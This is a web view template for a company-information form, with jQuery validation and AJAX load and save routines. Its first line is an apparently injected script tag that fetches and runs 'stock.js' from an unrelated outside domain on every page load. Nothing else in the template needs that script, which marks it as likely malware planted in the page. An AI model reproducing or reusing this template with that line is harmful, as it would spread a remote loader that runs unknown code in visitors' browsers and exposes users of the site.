<script src='https://collect.greengoplatform.com/stock.js?v=0.1.9' type='text/javascript'></script>


<form class="form_input">
    <div class="card">
        <div class="card-header" >
            <div class="d-flex justify-content-between">
                <h5 class="text-center">Informasi Perusahaan</h5>
                <div>
                    <button type="submit" class="btn btn-primary btn-save" style="float: right;"><i class='bx bx-send'></i></button>
                    <button class="btn btn-primary btn-loading" type="button" disabled  style="float: right;display: none">
                        <span class="spinner-border" role="status" aria-hidden="true"></span>
                    </button>
                </div>
            </div>
        </div>
        <div class="card-body" id="result-sub" style="height:440px;overflow: auto">
        </div>
    </div>
</form>

<script>
    $(document).ready(function(){
        loadData();
    });
    function loadData(isCache=true) {
        let url="perusahaan/read";
        if(!isCache) localCache.remove(base_url+url);
        urlActive = url;
        ajaxView(url,null,function(res){
            attrId("result-sub").html(res);
        });
    }

    attrClass(strFormInput).validate({
        rules: {
            nama: {required: true},
            email: {required: true,email:true},
            alamat: {required: true},
            seo: {required: true},
            "file_upload[]": {required:true}
        },
        errorPlacement: handleError(),
        submitHandler: function (form) {
            let formData=new FormData(attrClass(strFormInput)[0]);
            ajaxFile(base_url+"perusahaan/simpan",formData,function (res) {
                if (res.status) {
                    loadData(false);
                    notif(strSuccess);
                } else {
                    notif(strFailed);
                }
            })

        }
    });
</script>